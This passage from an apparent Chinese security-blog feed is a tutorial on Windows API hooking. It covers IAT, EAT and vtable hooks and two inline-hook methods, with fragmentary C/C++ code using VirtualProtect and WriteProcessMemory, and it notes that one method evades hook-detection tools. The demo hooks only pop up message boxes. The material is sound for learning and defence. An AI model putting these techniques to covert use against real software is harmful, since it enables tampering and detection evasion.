class="comment">; 指向下一个地址</span></div><div class="line">0218CF31    <span class="number">8985</span> 10D9FFFF   <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-26F0], <span class="built_in">eax</span>        <span class="comment">; 写入</span></div><div class="line">0218CF37  ^ E9 4DFCFFFF     <span class="keyword">jmp</span>     0218CB89                         <span class="comment">; 便利下一个</span></div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x0-前言&quot;&gt;&lt;a href=&quot;#0x0-前言&quot; class=&quot;headerlink&quot; title=&quot;0x0 前言&quot;&gt;&lt;/a&gt;0x0 前言&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
      
    
    </summary>
    
      <category term="windows安全" scheme="http://yoursite.com/categories/windows%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>一篇文章带你理解HOOK技术</title>
    <link href="http://yoursite.com/2019/04/18/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3HOOK%E6%8A%80%E6%9C%AF/"/>
    <id>http://yoursite.com/2019/04/18/一篇文章带你理解HOOK技术/</id>
    <published>2019-04-18T07:02:11.000Z</published>
    <updated>2019-05-18T08:39:43.949Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1.这是《一篇文章带你….》系列的第三篇，也是自己的学习总结，很多不懂的地方找的论坛前辈的资料。代码都是自己手敲，边敲边注释，对一些细节做了微调。前两篇是<a href="https://bbs.pediy.com/thread-251148.htm" target="_blank" rel="external">一篇文章带你学会Armadillo脱壳</a>和<a href="https://bbs.pediy.com/thread-250924.htm" target="_blank" rel="external">一篇文章带你理解PE三表 </a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2.几个驱动相关的HOOK，从代码层面上讲理解的不是很深刻。但是手敲了一边除了一些驱动相关的知识，HOOK原理上应该有所领悟。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3.还是一样，不提供源码下载，驱动相关的HOOK，前辈们都写有源码。不作伸手党。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.想来想去，这篇文章已经停滞1个多月了，今天草草结笔。关于HOOK检测部分估计需要鸽了。有空再学习吧。看雪第四版有源码。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5.这篇文章是新瓶装旧酒，大佬别喷我。下一篇文章预计写注入，代码已经写完了，就剩下总结了，同样的还是新瓶装旧酒。旨在学习。下下一篇我也不知道写什么？加壳？花指令？？管他呢。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6.唉，我什么时候才能成为像各位一样的大佬啊^_^</p><h1 id="0x1-AddressHook"><a href="#0x1-AddressHook" class="headerlink" title="0x1 AddressHook"></a>0x1 AddressHook</h1><h2 id="0x1-1-IAT-HOOK"><a href="#0x1-1-IAT-HOOK" class="headerlink" title="0x1.1 IAT_HOOK"></a>0x1.1 IAT_HOOK</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IAT是程序中存储导入函数地址的数据结构，如果HOOK了导入函数地址。就可以在函数调用的时候，将函数流程HOOK到我们指定的流程。但是我个人觉得这种方式最好要结合DLL注入的方式，如果单纯的使用HOOK，那么就需要将需要执行的操作的shellcode写入目标进程，如果操作复杂，可能需要的shellcode量特别大，<strong>所以我们需要借助DLL注入</strong>，这样就将我们需要执行的代码写入进程内部，在HOOK的Detour函数只需要实现LoadLibrary的操作。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IATHOOK的基本原理就是通过修改程序IAT数据结构，将原始调用API函数地址Target函数地址修改为Detour函数地址。所以IAT_HOOK需要实现以下几个步骤:</p><ul><li>构造Detour函数</li><li>获取Target函数地址</li><li>通过PE获取Target函数所在的IAT的地址</li><li>保存原始的IAT地址和IAT地址所存储的内容</li><li>修改IAT地址中的数据</li><li>如果需要调用原来API函数，可以直接使用保存的API地址，可以就保证了HOOK的有效性</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先需要构造Detour函数，为了堆栈平衡和一些其他原因，最好Detour函数的函数原型和Target函数原型保持一致。<br><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">typedef int(<span class="type">WINAPI</span> *<span class="type">PFN_MessageBoxA</span>)(<span class="type">HWND</span> hWnd, <span class="type">LPCTSTR</span> lpText, <span class="type">LPCTSTR</span> lpCaption, <span class="type">UINT</span> uType);</div><div class="line"><span class="title">int</span> <span class="type">WINAPI</span> <span class="type">My_MessageBoxA</span>(</div><div class="line"><span class="type">HWND</span> hWnd,</div><div class="line"><span class="type">LPCTSTR</span> lpText,</div><div class="line"><span class="type">LPCTSTR</span> lpCaption,</div><div class="line"><span class="type">UINT</span> uType</div><div class="line">)</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个函数的内容可以任意设置，主要执行两个方面的操作，<strong>一是执行我们想进行的操作，二是控制Target函数的返回值。</strong>为了简单期间，设置MessageBox作为HOOK，标志，MessageBox函数地址可以使用保存的API函数<br><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">bReturn = OldMessageBox(<span class="literal">NULL</span>, <span class="string">"You Are Hooked"</span>, <span class="string">"Warning"</span>, MB_OK);</div><div class="line"><span class="comment">//2.你可以控制API函数的返回值</span></div><div class="line"><span class="built_in">BOOL</span> bReturn = <span class="literal">FALSE</span>;</div><div class="line"><span class="keyword">return</span> bReturn;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二歩是获取Target函数地址，这一步的目的是为了遍历IAT的时候比较IAT中所存储的Target函数地址。以便找到存放目标函数的IAT地址。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">||<span class="meta">#<span class="meta-keyword">ifdef</span> _WIN64</span></div><div class="line">ULONG_PTR TargetFunAddr = (ULONG_PTR)GetProcAddress(hModule, szFuncName);</div><div class="line">PULONG_PTR lpAddr = <span class="literal">NULL</span>;</div><div class="line">SIZE_T size = <span class="keyword">sizeof</span>(PULONG_PTR);</div><div class="line">||<span class="meta">#<span class="meta-keyword">else</span></span></div><div class="line">ULONG32  TargetFunAddr = (ULONG32)GetProcAddress(hModule, szFuncName);</div><div class="line">PULONG32 lpAddr = <span class="literal">NULL</span>;</div><div class="line">SIZE_T size = <span class="keyword">sizeof</span>(PULONG32);</div><div class="line">||<span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"><span class="comment">//MARKDOWN原因，不能以#开头，所以加个||符号，实际代码不存在||符号</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第三步是获取Target函数的IAT地址，首先需要获取导入表的RVA，这里可以使用函数<code>ImageDirectoryEntryToData</code>获取<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = (<span class="name">PIMAGE_IMPORT_DESCRIPTOR</span>)ImageDirectoryEntryToData(<span class="name">hModToHook</span>,</div><div class="line">TRUE,</div><div class="line">IMAGE_DIRECTORY_ENTRY_IMPORT,</div><div class="line"><span class="symbol">&amp;ulSize</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PE装载器已经将PE文件载入内存，可以使用IAT获取函数地址，所以通过FirstThunk指向的IAT遍历Target函数。需要判断DLLNAME是否是Target函数所在的模块，也就是说需要确定IID,<strong>毕竟一个IID对应一个DLL</strong><br><figure class="highlight rust"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">while</span> (pImportDescriptor-&gt;FirstThunk)</div><div class="line">&#123;</div><div class="line"><span class="comment">//存放DllName</span></div><div class="line">szModName = (<span class="built_in">char</span>*)((PBYTE)hModToHook + pImportDescriptor-&gt;Name);</div><div class="line">printf(<span class="string">"[*]Cur Module Name:%s\n"</span>, szModName);</div><div class="line"><span class="comment">//比较DLLName与目标DLL是否相同  使用stricmp函数是不区分大小写的</span></div><div class="line"><span class="keyword">if</span> (stricmp(szModName, szModuleName) != <span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">pImportDescriptor++;</div><div class="line"><span class="keyword">continue</span>;</div><div class="line">&#125;</div><div class="line">...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;First指向的是一个IAT结构，存储的API函数地址。所以可以利用PIMAGE_THUNK_DATA(IAT)遍历Target函数。<strong>如果找到了最好保存修改的IAT地址和数据</strong>。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">PIMAGE_THUNK_DATA pThunkData = (PIMAGE_THUNK_DATA)((BYTE*)hModToHook + pImportDescriptor-&gt;FirstThunk);</div><div class="line"><span class="keyword">while</span> (pThunkData-&gt;u1.Function)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> ((*lpAddr) == TargetFunAddr)</div><div class="line">&#123;</div><div class="line"><span class="comment">//保存数据，修改为Detour函数地址</span></div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">//最好保存一下</span></div><div class="line"><span class="keyword">if</span> (pThunkPointer != <span class="keyword">NULL</span>)   <span class="comment">//保存修改内存的地址</span></div><div class="line">&#123;</div><div class="line">*pThunkPointer = lpAddr;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (pOriginalFuncAddr != <span class="keyword">NULL</span>)   <span class="comment">//保存修改内存的数据，也就是Target函数的地址</span></div><div class="line">&#123;</div><div class="line">*pOriginalFuncAddr = *lpAddr;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>这里我实现了X64和X86的兼容，但是在实现X86的时候，出现了内存访问异常在VirtuallProtest处，但是在debug模式下程序没奔溃，需要那位大佬可以解答一下</strong></p><h2 id="0x1-2-EAT-HOOK"><a href="#0x1-2-EAT-HOOK" class="headerlink" title="0x1.2 EAT_HOOK"></a>0x1.2 EAT_HOOK</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用EAT_HOOK需要注意一下两点：第一：EAT存储的是函数地址的偏移，<strong>所以在HOOK EAT的时候需要加上基地址</strong>，在写入EAT的时候，Detour地址需要减去BaseAddress。第二，EAT不对隐式链接起作用，<strong>只对显示链接起作用</strong>，也就是说对于那种<strong>GetProcAddress的那种调用</strong>起作用。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EAT_HOOK的原理和IAT_HOOK类似，都是通过修改函数地址数据从而HOOK。EAT_HOOK，也需要进行以下步骤：</p><ul><li>1.获取Target函数在HookModule上的RVA</li><li>2.获取导出函数数组首地址</li><li>3.遍历查找Target函数RVA</li><li>4.切记在修改函数地址之前，需要保存EAT地址和原函数地址、</li><li>5.将Detour函数地址写入EAT</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先是获取Target函数RVA，因为EAT存的是函数的RVA，所以，我们需要获取Target函数RVA<br><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//1.获取Target函数在HookModule上的RVA</span></div><div class="line">ULONG_PTR TargetFunAddr = NULL;</div><div class="line">TargetFunAddr = (ULONG_PTR)GetProcAddress(hModToHook, szFuncName);</div><div class="line">ULONG_PTR TargetFunRVA = NULL;</div><div class="line">TargetFunRVA = (ULONG_PTR)(TargetFunAddr - (ULONG_PTR)hModToHook);</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二歩是获取导出函数数组首地址，在EAT-&gt;AddressOfFunctions可以获取导出函数地址数组AddressOfFunctions的首地址<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">PIMAGE_EXPORT_DIRECTORY pExportDir = NULL<span class="comment">;</span></div><div class="line">pExportDir = (<span class="name">PIMAGE_EXPORT_DIRECTORY</span>)ImageDirectoryEntryToData(<span class="name">hModToHook</span>,//BaseAddress</div><div class="line">TRUE,</div><div class="line">IMAGE_DIRECTORY_ENTRY_EXPORT,   //Type</div><div class="line"><span class="symbol">&amp;ulSize</span>)<span class="comment">;                       //接收数据的大小</span></div><div class="line">ULONG* FuncAddr = NULL<span class="comment">;</span></div><div class="line">FuncAddr = (<span class="name">ULONG*</span>)((<span class="name">BYTE*</span>)hModToHook + pExportDir-&gt;AddressOfFunctions)<span class="comment">;  //导出函数数组首地址</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第三步是在EAT在寻找Target函数的RVA<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (FuncAddr[i] == TargetFunRVA)</div><div class="line">&#123;</div><div class="line"><span class="comment">//修改内存保护属性</span></div><div class="line">DWORD OldProtect = <span class="literal">NULL</span>;</div><div class="line"><span class="keyword">if</span> (VirtualProtect(&amp;FuncAddr[i], <span class="keyword">sizeof</span>(ULONG*), PAGE_EXECUTE_READWRITE, &amp;OldProtect))</div><div class="line">&#123;</div><div class="line"><span class="comment">//修改保存数据</span></div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第四步是保存EAT地址和Target函数RVA<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">*pAddrPointer = (PULONG_PTR)&amp;FuncAddr<span class="string">[i]</span>;</div><div class="line">*pOriginalFuncAddr = FuncAddr<span class="string">[i]</span>;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>EAT保存的是Target函数的RVA</strong>，这一定要记住。所以在写入Detour函数的时候，是需要减去BaseAddress的。<br><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//5.将Detour函数地址写入EAT</span></div><div class="line"><span class="comment">//因为EAT里面保存的是函数地址RVA值，所以在写入Detour函数地址需要减去BaseAddress</span></div><div class="line">FuncAddr[i] = (ULONG)((ULONG_PTR)DetourFunc-(ULONG_PTR)hModToHook);</div></pre></td></tr></table></figure></p><h2 id="0x1-3-VirtualFunctionHook"><a href="#0x1-3-VirtualFunctionHook" class="headerlink" title="0x1.3 VirtualFunctionHook"></a>0x1.3 VirtualFunctionHook</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C++虚函数存在的意义是为了方便使用多态性。在实现虚函数Hook的时候需要注意如下问题：1.在构建DetourFun函数的时候，一定要构造DetourClass，因为在调用虚函数的时候使用了Thiscall的函数调用约定，如果直接调用detourfun函数应该使用的标准调用约定，两者不统一，会出错。2.当使用Trampolinefun回调的时候，需要重新实例化一个TrampolineClass。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第一步：仍然是构造DetourClass类和TrampolineClass类<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//因为使用了This的调用方法，所以在Hook的时候同时需要创建DetourClass类，保证函数约定是一致的</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">DetourClass</span></span></div><div class="line"><span class="class">&#123;</span></div><div class="line"><span class="keyword">public</span>:</div><div class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">DetourFun</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</div><div class="line">&#125;;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">TrampolineClass</span></span></div><div class="line"><span class="class">&#123;</span></div><div class="line"><span class="keyword">public</span>:</div><div class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">TrampolineFun</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"TrampolineFun"</span>);</div><div class="line"><span class="keyword">return</span> a + b;</div><div class="line">&#125;</div><div class="line">&#125;;</div><div class="line"><span class="comment">//此处构造DetourFun</span></div><div class="line"><span class="keyword">int</span> DetourClass::DetourFun(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</div><div class="line">&#123;</div><div class="line"><span class="comment">//此处执行自定义操作</span></div><div class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">"Hooked"</span>, <span class="string">"warning"</span>, MB_OK);</div><div class="line"><span class="comment">//调用TrampolineFun，首先需要将TrampolineClass实例化</span></div><div class="line">TrampolineClass *pTrampoline = <span class="keyword">new</span> TrampolineClass;</div><div class="line"><span class="keyword">int</span> iRet = pTrampoline-&gt;TrampolineFun(a, b);</div><div class="line"><span class="keyword">delete</span> pTrampoline;</div><div class="line"><span class="keyword">return</span> iRet+<span class="number">10</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二歩：将Target函数地址保存在TableTrampoline虚表中，方便回调。这时候需要获取两个值，第一个TableTrampoline虚表，第二个TargetFun地址。由于TableTrampoline虚函数表在类的起始位置。所以类的地址就是虚函数表的地址，第二，TargetFun函数地址位于虚函数中，存储在类似于数组的结构，可以用其索引指向获取虚函数地址<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//获取虚表地址vfTableToHook</span></div><div class="line"><span class="keyword">base</span> <span class="keyword">base</span>;</div><div class="line">printf(<span class="string">"[*]pBase=0x%x\n"</span>, &amp;<span class="keyword">base</span>);</div><div class="line">ULONG_PTR *vfTableToHook = (ULONG_PTR*)*(ULONG_PTR*)&amp;<span class="keyword">base</span>;</div><div class="line"><span class="comment">//获取Trampoline虚表地址，用于回调</span></div><div class="line">ULONG_PTR *vfTableTrampoline = (ULONG_PTR*)*(ULONG_PTR*)&amp;Trampoline;</div><div class="line"><span class="comment">//第一次修改，用于保存原始的Target函数地址</span></div><div class="line"><span class="comment">//修改内存保护属性</span></div><div class="line">VirtualProtect(vfTableTrampoline, <span class="keyword">sizeof</span>(ULONG_PTR), PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</div><div class="line">vfTableTrampoline[<span class="number">0</span>] = (ULONG_PTR)GetClassVirtualFnAddress(&amp;<span class="keyword">base</span>, <span class="number">0</span>);</div><div class="line">printf(<span class="string">"[*]vfTableTrampoline=0x%x\n"</span>, vfTableTrampoline[<span class="number">0</span>]);</div><div class="line">VirtualProtect(vfTableTrampoline, <span class="keyword">sizeof</span>(ULONG_PTR), dwOldProtect, &amp;dwOldProtect);</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第三步，将Detour函数地址写入到TargetClass的原始虚表TableToHook中<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//第二次修改，为了HookTarget函数，修改原始虚表</span></div><div class="line">VirtualProtect(vfTableToHook, sizeof(ULONG_PTR), PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</div><div class="line">vfTableToHook[<span class="number">0</span>] = (ULONG_PTR)GetClassVirtualFnAddress(&amp;Detour, <span class="number">0</span>);</div><div class="line">printf(<span class="string">"[*]vfTableTrampoline=0x%x<span class="subst">\n</span>"</span>, vfTableToHook[<span class="number">0</span>]);</div><div class="line">VirtualProtect(vfTableToHook, sizeof(ULONG_PTR), dwOldProtect, &amp;dwOldProtect);</div></pre></td></tr></table></figure></p><h1 id="0x2-InlineHook"><a href="#0x2-InlineHook" class="headerlink" title="0x2 InlineHook"></a>0x2 InlineHook</h1><h2 id="0x2-1-InlineHook-A"><a href="#0x2-1-InlineHook-A" class="headerlink" title="0x2.1 InlineHook(A)"></a>0x2.1 InlineHook(A)</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这一类InlineHook是一类较为特殊的InlineHook，他修改的不是开始的多个字节，而是修改Target函数中call指令的地址。比如说VirtualAlloc函数中调用了VirtualAllocEx函数，这次inlineHook其实就是修改了VirtualAllocEx的地址(调用处的地址)，这样做的好处是可以避免被一些Hook检测工具检测。但是这样的缺点是兼容性不是很好，因为一些API的函数可能会因为系统的改变而改变。<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">do</span></div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (pTargetFun[<span class="number">0</span>] == <span class="number">0xE8</span>)</div><div class="line">&#123;</div><div class="line"><span class="comment">//获取VirtualAllocEx地址</span></div><div class="line">addrTemp = (<span class="keyword">ULONG</span>)pTargetFun + <span class="number">5</span> + *(<span class="keyword">LONG</span>*)(pTargetFun + <span class="number">1</span>);</div><div class="line"><span class="comment">//比较是否相同</span></div><div class="line"><span class="keyword">if</span> (addrTemp == addrTargetFun)</div><div class="line">&#123;</div><div class="line">bResult = <span class="keyword">TRUE</span>;</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">i++;</div><div class="line">pTargetFun++;</div><div class="line">&#125; <span class="keyword">while</span> (i &lt; <span class="number">0x30</span>);</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果比较无误后修改DetourFun<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//保存修改的地址</span></div><div class="line">g_PointerToRawData = (<span class="keyword">ULONG</span>)(pTargetFun + <span class="number">1</span>);</div><div class="line"><span class="comment">//保存修改的内容</span></div><div class="line">g_RawOffset = *(<span class="keyword">ULONG</span>*)(pTargetFun + <span class="number">1</span>);</div><div class="line"><span class="comment">//保存Detour函数到Target函数的偏移量</span></div><div class="line">addrTemp= (<span class="keyword">LONG</span>)DetourVirtualAllocEx - (<span class="keyword">LONG</span>)pTargetFun - <span class="number">5</span></div><div class="line"><span class="comment">//修改</span></div><div class="line">bResult = WriteProcessMemory(GetCurrentProcess(), pTargetFun + <span class="number">1</span>, &amp;addrTemp, sizeof(<span class="keyword">LONG</span>), <span class="keyword">NULL</span>);</div></pre></td></tr></table></figure></p><h2 id="0x2-2-InlineHook-B"><a href="#0x2-2-InlineHook-B" class="headerlink" title="0x2.2 InlineHook(B)"></a>0x2.2 InlineHook(B)</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这种InlineHook修改的是Target函数前5个字节，这种做的好处是能够多版本进行HOOK，因为如果是采用上一种InlineHook，可能内部调用流程随着版本不同而不同，所以不容易Hook。而这种就没有这种缺点。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用InlineHook，需要了解到三种函数：</p><ul><li>Target函数：目标函数，我们选定的HOOK的函数</li><li>Detour函数：我们构造的函数，用于搭载HOOK完Target函数后，我们制定的操作</li><li>TrampolineFun函数：负责回调Target函数，在回调的时候，需要注意的时候重新执行HOOK修改的三条指令，并绕过HOOK的地方</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;InlineHook主要的步骤就是修改Target函数的前五个字节。大概有以下几个步骤：</p><ul><li>Step1：构造Detour函数</li><li>Step2：构造TrampolineFun函数</li><li>Step3：获取TrampolineFun和HookPoint的地址。</li><li>Step4：填充需要修改的指令</li><li>Step5：使用ReadProcessMemory保存原指令</li><li>Step5：使用WriteProcessMemory修改Target函数指令</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;虽然步骤看着简单，但是里面坑还是很多的。首先是构造构造Detour函数，<strong>这里需要注意的是Detour函数声明需要和Target函数保持一致，否则函数返回会异常</strong>,而且还要在DetourFun中还要调用TrampolineFun。</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//第一步设置Detour函数</span></div><div class="line"><span class="comment">//Detour函数的函数声明需要和Target函数保持一致，否则函数返回会异常</span></div><div class="line"><span class="keyword">int</span> WINAPI My_MessageBoxA(<span class="keyword">HWND</span> <span class="keyword">hWnd</span>, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType)</div><div class="line">&#123;</div><div class="line"><span class="comment">//修改操作</span></div><div class="line"><span class="keyword">int</span> iResult = <span class="number">0</span><span class="comment">;</span></div><div class="line">lpText = <span class="string">"Hooked"</span><span class="comment">;</span></div><div class="line">iResult = OriginalMessageBox(<span class="keyword">hWnd</span>, lpText, lpCaption, uType)<span class="comment">;</span></div><div class="line"><span class="comment">//修改返回值</span></div><div class="line">iResult = <span class="number">0</span><span class="comment">;</span></div><div class="line"><span class="keyword">return</span> iResult<span class="comment">;</span></div><div 